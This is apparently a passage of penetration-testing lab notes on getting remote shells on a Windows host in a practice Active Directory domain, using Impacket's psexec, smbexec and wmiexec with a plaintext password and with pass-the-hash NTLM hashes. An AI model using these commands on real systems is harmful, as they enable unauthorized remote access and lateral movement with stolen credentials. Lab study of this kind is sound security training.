***psexec.py MARVEL/fcastle:’Password1'@192.168.1.11***

<img width="720" height="304" alt="image" src="https://github.com/user-attachments/assets/a613f721-66ea-442b-a48d-1e841c875e8f" />

We can also use hashes to login

***psexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="244" alt="image" src="https://github.com/user-attachments/assets/b7c1d6ac-dbd7-4726-9eab-b34f750a2d71" />

Now, for any reason psexec.py is not working, there are others options as well

***impacket-smbexec administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="139" alt="image" src="https://github.com/user-attachments/assets/550d2a9e-39ff-497f-8d25-3b25ecbdbc7f" />

***smbexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="173" alt="image" src="https://github.com/user-attachments/assets/40a49cc1-fb9b-40e7-8b24-9d39fd1b052b" />

***wmiexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="98" alt="image" src="https://github.com/user-attachments/assets/86e43832-c59c-4d66-9150-5c6ec00364b4" />

In our case wmiexec.py is not working.
